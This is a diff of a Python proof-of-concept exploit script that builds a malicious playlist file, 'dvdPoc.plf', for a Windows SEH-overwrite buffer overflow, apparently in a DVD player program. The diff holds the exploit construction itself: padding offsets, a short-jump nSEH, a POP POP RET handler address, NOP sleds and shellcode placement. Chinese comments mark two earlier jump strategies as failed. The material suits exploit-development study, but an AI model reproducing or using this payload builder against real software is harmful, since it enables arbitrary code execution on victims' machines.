@@ -4,6 +4,7 @@ uniq=b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3A
 
 seh=pwn.p32(0x6164172e)#POPOPRET
 
+#直接跳的方案，失败
 #0012F5BC   6164172E  .da  SE handler
 # seh_direct_jmp=pwn.p32(0x0012F5BC-4-len(shellcode2))
 
@@ -13,10 +14,18 @@ jmp_prev_355=bytes.fromhex("E9 98 FE FF FF")
 jmp_prev_364=bytes.fromhex("E9 8F FE FF FF")
 jmp_prev_220=bytes.fromhex("E9 1F FF FF FF")
 jmp_prev_215=bytes.fromhex("E9 24 FF FF FF")
+jmp_next_6=b"\xEB\x06\x90\x90"
+
+
 print(len(shellcode_calc))
-nseh=jmp_prev_6
-buffer = b"A"*(608-len(shellcode2)-len(jmp_prev_215)-1)+shellcode2+jmp_prev_364+b'\x90'+nseh+seh+b"B"*(702-608-len(nseh)-len(seh))
-print(len(buffer))
+
+#放在低代码空间的方案，失败
+# buffer = b"A"*(608-len(shellcode2)-len(jmp_prev_215)-1)+shellcode2+jmp_prev_364+b'\x90'+nseh+seh+b"B"*(702-608-len(nseh)-len(seh))
+# print(len(buffer))
+
+buffer = b"A"*608 + jmp_next_6 +seh + b"\x90"*8+shellcode2+b"\x90"*8+b"C"*(1002-608-4-4-len(shellcode2)-8*2)
+# buf=shellcode2
+# buffer = b"\x41"*608 + jmp_next_6 +seh + b"\x90"*8+buf+b"\x90"*8+b"\x44"*(1002-608-4-4-len(buf)-8*2)
 
 filename = "dvdPoc.plf"
 textfile = open(filename, 'wb')
